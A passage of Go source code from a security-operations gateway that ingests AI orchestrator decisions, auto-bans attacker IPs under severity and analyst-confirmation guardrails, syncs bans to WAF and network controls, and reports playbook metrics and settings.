	log.Printf("[API GATEWAY INTERNAL] Ingested and processed L2 Decision from Qwen. IncidentID: %s, AttackType: %s, SourceIP: %s, AffectedAccount: %s, Severity: %s, Risk: %.1f, Decision: %s, Actions: %v",
		info.IncidentID, info.AttackType, info.SourceIP, info.AffectedAccount, info.Severity, info.RiskScore, dec.Decision.FinalDecision, processedActions)

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"status":            "success",
		"message":           "SOAR L2 Orchestrator Decision ingested and parsed successfully.",
		"incident_id":       info.IncidentID,
		"attack_type":       info.AttackType,
		"source_ip":         info.SourceIP,
		"affected_account":  info.AffectedAccount,
		"severity":          info.Severity,
		"processed_actions": processedActions,
	})
}

type soarProcessOptions struct {
	AllowAnalystConfirmedBan bool
}

func processParsedSoarDecision(dec *SoarDecisionPayload, info *ParsedSoarInfo, bodyBytes []byte) []string {
	return processParsedSoarDecisionWithOptions(dec, info, bodyBytes, soarProcessOptions{})
}

func processParsedSoarDecisionWithOptions(dec *SoarDecisionPayload, info *ParsedSoarInfo, bodyBytes []byte, opts soarProcessOptions) []string {
	processedActions := ingestExecutedSoarActions(dec, info, opts)
	upsertSoarAlert(dec, info, bodyBytes)
	return processedActions
}

func ingestExecutedSoarActions(dec *SoarDecisionPayload, info *ParsedSoarInfo, opts soarProcessOptions) []string {
	var processedActions []string

	for _, act := range dec.Actions {
		if act.Status != "executed" {
			continue
		}

		mappedActionType := mapSoarActionType(act.ActionType)
		actionStatus := "success"
		actionTarget := act.Target.ValueMasked
		detailMsg := act.Rationale
		if detailMsg == "" {
			detailMsg = "SOAR playbook action executed."
		}

		if !store.IsPersistentSecurityActionType(mappedActionType) {
			processedActions = append(processedActions, fmt.Sprintf("%s observed without persistence", mappedActionType))
			continue
		}

		if mappedActionType == "Block IP" {
			if allowed, reason := autoBlockAllowed(dec, info, opts); !allowed {
				actionStatus = "blocked_by_policy"
				detailMsg = reason
				actionLog := appendSoarActionLog(mappedActionType, actionTarget, actionStatus, detailMsg)
				processedActions = append(processedActions, fmt.Sprintf("%s skipped on %s: %s", actionLog.ActionType, actionLog.Target, reason))
				continue
			}

			normalizedTarget, normalizeErr := NormalizeIPExpression(act.Target.ValueMasked)
			if normalizeErr != nil {
				actionStatus = "failed"
				detailMsg = fmt.Sprintf("SOAR block_ip target rejected as invalid IP/CIDR: %s", act.Target.ValueMasked)
			} else if protectedIPTarget(normalizedTarget) {
				actionStatus = "blocked_by_policy"
				detailMsg = "SOAR autoban skipped: private, loopback, or unspecified IP targets are never autobanned"
				actionLog := appendSoarActionLog(mappedActionType, actionTarget, actionStatus, detailMsg)
				processedActions = append(processedActions, fmt.Sprintf("%s skipped on %s: %s", actionLog.ActionType, actionLog.Target, detailMsg))
				continue
			} else {
				actionTarget = normalizedTarget
				if err := store.SaveSQLBannedIP(normalizedTarget, "SOAR L2 Orchestrator", "active", act.Rationale); err != nil {
					actionStatus = "failed"
					detailMsg = fmt.Sprintf("Failed to persist SOAR IP block for %s: %v", normalizedTarget, err)
				} else if err := syncWAFBannedIP(normalizedTarget, "active"); err != nil {
					actionStatus = "failed"
					detailMsg = fmt.Sprintf("Failed to sync SOAR WAF IP block for %s: %v", normalizedTarget, err)
				} else if err := syncNetworkBannedIP(normalizedTarget, "active"); err != nil {
					actionStatus = "failed"
					detailMsg = fmt.Sprintf("Failed to sync SOAR network ACL IP block for %s: %v", normalizedTarget, err)
				} else if err := syncBankBannedIP(normalizedTarget, "SOAR L2 Orchestrator", "active", act.Rationale); err != nil {
					detailMsg = fmt.Sprintf("%s Bank application sync warning: %v.", detailMsg, err)
				}
			}
		}

		actionLog := appendSoarActionLog(mappedActionType, actionTarget, actionStatus, detailMsg)
		processedActions = append(processedActions, fmt.Sprintf("%s on %s", actionLog.ActionType, actionLog.Target))
	}

	return processedActions
}

func autoBlockAllowed(dec *SoarDecisionPayload, info *ParsedSoarInfo, opts soarProcessOptions) (bool, string) {
	if opts.AllowAnalystConfirmedBan {
		return true, ""
	}
	if dec == nil || info == nil {
		return false, "SOAR autoban blocked: missing decision context."
	}
	autopilotEnabled := false
	if val, err := store.GetSQLSetting("soc_autopilot_enabled"); err == nil && val == "true" {
		autopilotEnabled = true
	}
	isSQLi := isSQLInjectionDecision(dec, info)
	if isSQLi {
		if !autopilotEnabled {
			return false, "SOAR autoban skipped: SQL injection is alert-only for automatic containment; analyst confirmation is required."
		}
	}
	if !info.ThreatConfirmed {
		return false, "SOAR autoban skipped: threat is not independently confirmed."
	}
	if strings.ToLower(info.Severity) != "critical" && info.RiskScore < 9.0 {
		if !(autopilotEnabled && isSQLi) {
			return false, fmt.Sprintf("SOAR autoban skipped: critical severity or risk >= 9.0 required, got severity=%s risk=%.1f.", info.Severity, info.RiskScore)
		}
	}
	return true, ""
}

func isSQLInjectionDecision(dec *SoarDecisionPayload, info *ParsedSoarInfo) bool {
	if info != nil && store.IsSQLInjectionText(info.AttackType) {
		return true
	}
	if dec == nil {
		return false
	}
	return store.IsSQLInjectionText(
		dec.VerifiedCase.Title,
		dec.VerifiedCase.Summary,
		dec.Decision.Justification,
	)
}

func mapSoarActionType(actionType string) string {
	switch actionType {
	case "block_ip":
		return "Block IP"
	case "quarantine_host":
		return "Isolate Host"
	case "force_logout":
		return "Force Logout"
	case "disable_account":
		return "Revoke Credentials"
	case "preserve_logs":
		return "Preserve Logs"
	default:
		return actionType
	}
}

func appendSoarActionLog(actionType string, target string, status string, message string) *models.ActionLog {
	store.DB.Mu.Lock()
	store.DB.ActionCounter++
	actionLogID := fmt.Sprintf("act-soar-%04d", store.DB.ActionCounter)

	if actionType == "Isolate Host" {
		for _, a := range store.DB.Agents {
			if a.Name == target || a.ID == target {
				a.Status = "disconnected"
				message = fmt.Sprintf("Host %s isolated by SOAR Engine. Local interfaces disabled.", a.Name)
				break
			}
		}
	}

	actionLog := &models.ActionLog{
		ID:         actionLogID,
		Timestamp:  time.Now(),
		Actor:      "SOAR L2 Orchestrator",
		ActionType: actionType,
		Target:     target,
		Status:     status,
		Message:    message,
	}
	store.DB.ActionLogs = append(store.DB.ActionLogs, actionLog)
	store.DB.Mu.Unlock()

	if store.UsePostgres {
		_, dbErr := store.SQL.Exec(`
			INSERT INTO action_logs (id, timestamp, actor, action_type, target, status, message)
			VALUES ($1, $2, $3, $4, $5, $6, $7)
		`, actionLog.ID, actionLog.Timestamp, actionLog.Actor, actionLog.ActionType, actionLog.Target, actionLog.Status, actionLog.Message)
		if dbErr != nil {
			log.Printf("[DATABASE ERROR] Failed to save SOAR action log to PostgreSQL: %v", dbErr)
		}
	}

	return actionLog
}

func upsertSoarAlert(dec *SoarDecisionPayload, info *ParsedSoarInfo, bodyBytes []byte) {
	if !info.ThreatConfirmed {
		return
	}

	store.DB.Mu.Lock()
	defer store.DB.Mu.Unlock()

	found := false
	for _, a := range store.DB.Alerts {
		if a.RuleID == "rule-soar-"+info.IncidentID || strings.Contains(a.Description, info.IncidentID) {
			a.Severity = info.Severity
			a.Title = "SOAR L2 Confirmed - " + info.AttackType
			a.Description = fmt.Sprintf("Confirmed attack of type %s from IP %s. Affected accounts: %s. Justification: %s",
				info.AttackType, info.SourceIP, info.AffectedAccount, dec.Decision.Justification)
			a.Status = "investigating"
			found = true
			if store.UsePostgres {
				_ = store.SaveSQLAlert(a)
			}
			break
		}
	}

	if found {
		return
	}

	store.DB.AlertCounter++
	newAlertID := fmt.Sprintf("alt-soar-%04d", store.DB.AlertCounter)

	agentID := "agent-01"
	agentName := "Web-Prod-01"
	if len(dec.VerifiedCase.Entities.Hosts) > 0 {
		hostVal := dec.VerifiedCase.Entities.Hosts[0]
		for _, ag := range store.DB.Agents {
			if ag.Name == hostVal || ag.ID == hostVal {
				agentID = ag.ID
				agentName = ag.Name
				ag.Status = "alerting"
				store.DB.SaveAgent(ag)
				break
			}
		}
	}

	alert := &models.Alert{
		ID:       newAlertID,
		RuleID:   "rule-soar-" + info.IncidentID,
		Severity: info.Severity,
		Title:    "SOAR L2 Confirmed - " + info.AttackType,
		Description: fmt.Sprintf("Confirmed attack of type %s from IP %s. Affected accounts: %s. Justification: %s",
			info.AttackType, info.SourceIP, info.AffectedAccount, dec.Decision.Justification),
		AgentID:        agentID,
		AgentName:      agentName,
		MITRETechnique: "T1190",
		MITRETactics:   []string{"Initial Access"},
		Category:       "network",
		Timestamp:      time.Now(),
		RawLog:         string(bodyBytes),
		Status:         "open",
	}

	store.DB.AddAlert(alert)
}

type AlertAutobanResult struct {
	Status           string   `json:"status"`
	Reason           string   `json:"reason,omitempty"`
	IncidentID       string   `json:"incident_id,omitempty"`
	SourceIP         string   `json:"source_ip,omitempty"`
	ProcessedActions []string `json:"processed_actions,omitempty"`
}

func ExecuteAlertAutobanFromOrchestrator(alert *models.Alert, trigger string) (*AlertAutobanResult, error) {
	if alert == nil {
		return &AlertAutobanResult{Status: "skipped", Reason: "nil alert"}, nil
	}

	target := attackerIPFromRawLog(alert.RawLog)
	if strings.TrimSpace(target) == "" {
		return &AlertAutobanResult{Status: "skipped", Reason: "alert does not contain an attacker IP"}, nil
	}
	normalizedTarget, err := NormalizeIPExpression(target)
	if err != nil {
		return &AlertAutobanResult{Status: "skipped", Reason: "alert attacker IP is invalid"}, nil
	}
	if protectedIPTarget(normalizedTarget) {
		return &AlertAutobanResult{Status: "skipped", SourceIP: normalizedTarget, Reason: "private, loopback, or unspecified IP targets are never autobanned"}, nil
	}
	if banned, err := store.IsIPBanned(normalizedTarget); err == nil && banned {
		return &AlertAutobanResult{Status: "skipped", SourceIP: normalizedTarget, Reason: "IP is already actively banned"}, nil
	}

	if allowed, reason := alertEligibleForAutoban(alert); !allowed {
		return &AlertAutobanResult{Status: "skipped", SourceIP: normalizedTarget, Reason: reason}, nil
	}

	decisionBytes, err := buildAlertBanDecision(alert, normalizedTarget)
	if err != nil {
		return nil, err
	}
	dec, info, err := ParseSoarDecision(decisionBytes)
	if err != nil {
		return nil, err
	}
	processedActions := processParsedSoarDecisionWithOptions(dec, info, decisionBytes, soarProcessOptions{})
	log.Printf("[SOAR AUTOBAN] trigger=%s alert=%s severity=%s ip=%s actions=%v", trigger, alert.ID, alert.Severity, normalizedTarget, processedActions)

	status := "skipped"
	for _, processedAction := range processedActions {
		if !strings.Contains(processedAction, " skipped ") {
			status = "executed"
			break
		}
	}
	return &AlertAutobanResult{
		Status:           status,
		IncidentID:       info.IncidentID,
		SourceIP:         normalizedTarget,
		ProcessedActions: processedActions,
	}, nil
}

func alertEligibleForAutoban(alert *models.Alert) (bool, string) {
	autopilotEnabled := false
	if val, err := store.GetSQLSetting("soc_autopilot_enabled"); err == nil && val == "true" {
		autopilotEnabled = true
	}
	isSQLi := store.IsSQLInjectionText(alert.Title, alert.Description, alert.RawLog)
	if isSQLi {
		if !autopilotEnabled {
			return false, "SQL injection alerts stay alert-only for automatic containment; analyst confirmation is required."
		}
	}
	if strings.EqualFold(alert.Status, "resolved") {
		return false, "resolved alerts are not eligible for autoban"
	}
	if strings.ToLower(alert.Severity) != "critical" {
		if !(autopilotEnabled && isSQLi) {
			return false, fmt.Sprintf("autoban requires critical severity; got %s", alert.Severity)
		}
	}
	return true, ""
}

func protectedIPTarget(ipExpr string) bool {
	ipPart := ipExpr
	if idx := strings.Index(ipPart, "/"); idx != -1 {
		ipPart = ipPart[:idx]
	}
	parsedIP := net.ParseIP(ipPart)
	return parsedIP != nil && (parsedIP.IsLoopback() || parsedIP.IsPrivate() || parsedIP.IsUnspecified())
}

// POST /api/alerts/:id/orchestrated-ban
func OrchestrateAlertBan(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "Method not allowed"})
		return
	}

	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 5 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid Alert ID"})
		return
	}
	alertID := parts[3]

	var req struct {
		Target string `json:"target"`
	}
	_ = json.NewDecoder(r.Body).Decode(&req)

	store.DB.Mu.RLock()
	var alertCopy *models.Alert
	for _, alt := range store.DB.Alerts {
		if alt.ID == alertID {
			copied := *alt
			alertCopy = &copied
			break
		}
	}
	store.DB.Mu.RUnlock()

	if alertCopy == nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "Alert not found"})
		return
	}

	target := strings.TrimSpace(req.Target)
	if target == "" {
		target = attackerIPFromRawLog(alertCopy.RawLog)
	}
	normalizedTarget, err := NormalizeIPExpression(target)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Alert does not contain a valid attacker IP"})
		return
	}

	decisionBytes, err := buildAlertBanDecision(alertCopy, normalizedTarget)
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "Failed to build SOAR decision"})
		return
	}

	dec, info, err := ParseSoarDecision(decisionBytes)
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "Generated SOAR decision failed validation: " + err.Error()})
		return
	}
	processedActions := processParsedSoarDecisionWithOptions(dec, info, decisionBytes, soarProcessOptions{AllowAnalystConfirmedBan: true})

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"status":            "success",
		"message":           "Alert ban executed through SOAR L2 Orchestrator playbook PB-WEB-EDGE.",
		"incident_id":       info.IncidentID,
		"source_ip":         info.SourceIP,
		"severity":          info.Severity,
		"playbook_id":       "PB-WEB-EDGE",
		"processed_actions": processedActions,
	})
}

func attackerIPFromRawLog(rawLog string) string {
	var payload map[string]interface{}
	if err := json.Unmarshal([]byte(rawLog), &payload); err != nil {
		return ""
	}
	for _, key := range []string{"clientIp", "client_ip", "sourceIp", "source_ip", "srcIp", "ip"} {
		if value, ok := payload[key]; ok {
			if str := strings.TrimSpace(fmt.Sprint(value)); str != "" {
				return str
			}
		}
	}
	return ""
}

func buildAlertBanDecision(alert *models.Alert, ip string) ([]byte, error) {
	now := time.Now().UTC().Format(time.RFC3339)
	priority := strings.ToLower(alert.Severity)
	if priority == "" {
		priority = "critical"
	}
	score := riskScoreForSeverity(priority)
	host := alert.AgentName
	if host == "" {
		host = alert.AgentID
	}
	if host == "" {
		host = "Web-Prod-01"
	}

	decision := map[string]interface{}{
		"schema_version": "littleboy.soc.layer2.orchestrator_decision.v8",
		"timestamp":      now,
		"input_summary": map[string]interface{}{
			"incident_id": "alert-" + alert.ID,
		},
		"verified_case": map[string]interface{}{
			"threat_confirmed": true,
			"title":            alert.Title,
			"summary":          alert.Description,
			"entities": map[string]interface{}{
				"users":           []string{},
				"accounts_masked": []string{},
				"hosts":           []string{host},
				"ips":             []string{ip},
			},
		},
		"scoring": map[string]interface{}{
			"final_risk_score_0_10": score,
			"priority":              priority,
		},
		"policy_guardrails": map[string]interface{}{
			"opa_required": true,
			"opa_result":   "allow",
		},
		"automation_control": map[string]interface{}{
			"soc_autopilot_enabled":     true,
			"auto_containment_eligible": true,
			"execution_window": map[string]interface{}{
				"in_window": true,
			},
		},
		"playbook_routing": map[string]interface{}{
			"activated_playbooks": []map[string]interface{}{
				{
					"playbook_id":   "PB-WEB-EDGE",
					"trigger_type":  "analyst_confirmed_alert",
					"trigger_value": alert.MITRETechnique,
					"mode":          "auto_execute",
					"rationale":     "SOC analyst confirmed malicious web-edge attacker IP from alert table.",
				},
			},
		},
		"decision": map[string]interface{}{
			"final_decision": "auto_execute",
			"justification":  "SOC analyst confirmed the alert and executed PB-WEB-EDGE block_ip containment through the L2 gateway.",
		},
		"actions": []map[string]interface{}{
			{
				"action_id":       "act-alert-ban-" + alert.ID,
				"action_type":     "block_ip",
				"phase":           "contain",
				"approval_mode":   "AUTO",
				"status":          "executed",
				"playbook_source": "PB-WEB-EDGE",
				"rationale":       "PB-WEB-EDGE step-3a block_ip: block attacker IP to halt active exploit traffic.",
				"target": map[string]interface{}{
					"type":         "IP",
					"value_masked": ip,
				},
			},
		},
	}

	return json.Marshal(decision)
}

func riskScoreForSeverity(severity string) float64 {
	switch strings.ToLower(severity) {
	case "critical":
		return 9.5
	case "high":
		return 8.0
	case "medium":
		return 6.5
	case "low":
		return 3.0
	default:
		return 9.0
	}
}

// GET /api/soar/metrics
func GetSoarMetrics(w http.ResponseWriter, r *http.Request) {
	store.DB.Mu.RLock()
	defer store.DB.Mu.RUnlock()

	securityActions := make([]*models.ActionLog, 0)
	for _, act := range store.DB.ActionLogs {
		if act == nil || !store.IsPersistentSecurityActionType(act.ActionType) {
			continue
		}
		if !(strings.Contains(act.Actor, "SOAR") || strings.Contains(act.Actor, "AI")) {
			continue
		}
		securityActions = append(securityActions, act)
	}

	var responseTimes []float64

	for _, a := range store.DB.Alerts {
		if strings.HasPrefix(a.RuleID, "rule-") {
			var incidentID string
			if strings.HasPrefix(a.RuleID, "rule-soar-") {
				incidentID = strings.TrimPrefix(a.RuleID, "rule-soar-")
			} else if strings.HasPrefix(a.RuleID, "rule-sim-") {
				incidentID = strings.TrimPrefix(a.RuleID, "rule-sim-")
			} else {
				incidentID = a.ID
			}

			// Find matching ActionLog for this incident
			for _, act := range securityActions {
				if strings.Contains(act.Message, incidentID) || strings.Contains(act.ID, incidentID) || strings.Contains(act.Message, a.ID) {
					duration := act.Timestamp.Sub(a.Timestamp).Seconds()
					if duration > 0 && duration < 300 { // valid duration window (under 5 mins)
						responseTimes = append(responseTimes, duration)
					}
				}
			}
		}
	}

	totalPlaybooks := len(securityActions)

	successCount := 0
	failedCount := 0
	for _, act := range securityActions {
		if act.Status == "success" {
			successCount++
		} else if act.Status == "failed" {
			failedCount++
		}
	}

	successRate := 0.0
	if (successCount + failedCount) > 0 {
		successRate = (float64(successCount) / float64(successCount+failedCount)) * 100.0
	} else {
		successRate = 100.0 // Default to 100% if no actions have run
	}

	avgResponseTime := 0.0
	if len(responseTimes) > 0 {
		totalTime := 0.0
		for _, t := range responseTimes {
			totalTime += t
		}
		avgResponseTime = totalTime / float64(len(responseTimes))
	}

	metrics := map[string]interface{}{
		"totalPlaybooks":         totalPlaybooks,
		"successCount":           successCount,
		"failedCount":            failedCount,
		"successRate":            successRate,
		"avgResponseTimeSeconds": avgResponseTime,
	}

	writeJSON(w, http.StatusOK, metrics)
}

// GET /api/settings
func GetSettings(w http.ResponseWriter, r *http.Request) {
	val, err := store.GetSQLSetting("soc_autopilot_enabled")
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "Failed to read setting"})
		return
	}
	enabled := (val == "true")
	writeJSON(w, http.StatusOK, map[string]interface{}{
		"soc_autopilot_enabled": enabled,
	})
}

// POST /api/settings
func SaveSettings(w http.ResponseWriter, r *http.Request) {
	var req struct {
		AutopilotEnabled bool `json:"soc_autopilot_enabled"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid request body"})
		return
	}

	val := "false"
	if req.AutopilotEnabled {
		val = "true"
	}

	if err := store.SaveSQLSetting("soc_autopilot_enabled", val); err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "Failed to save setting"})
		return
	}

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"message":               "Settings updated successfully",
		"soc_autopilot_enabled": req.AutopilotEnabled,
	})
}

// GET /api/banned-ips
func GetBannedIPs(w http.ResponseWriter, r *http.Request) {
	list, err := store.GetSQLBannedIPs()
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "Failed to fetch banned IPs"})
		return
	}

	wafIPs, err := listWAFBannedIPs()
	if err != nil {
		log.Printf("[WAF SYNC] Failed to merge WAF blocklist into banned IP registry: %v", err)
	} else {
		seen := map[string]bool{}
		for _, entry := range list {
			seen[entry.IPAddress] = true
		}
		for _, ip := range wafIPs {
			if seen[ip] {
				continue
			}
			list = append(list, &models.BannedIP{
				IPAddress: ip,
				BannedAt:  time.Now(),
				BannedBy:  "AWS WAF / SOAR Autoban",
				Status:    "active",
				Reason:    "Runtime WAF blocklist (edge and ALB enforcement)",
			})
			seen[ip] = true
		}
	}

	writeJSON(w, http.StatusOK, list)
}
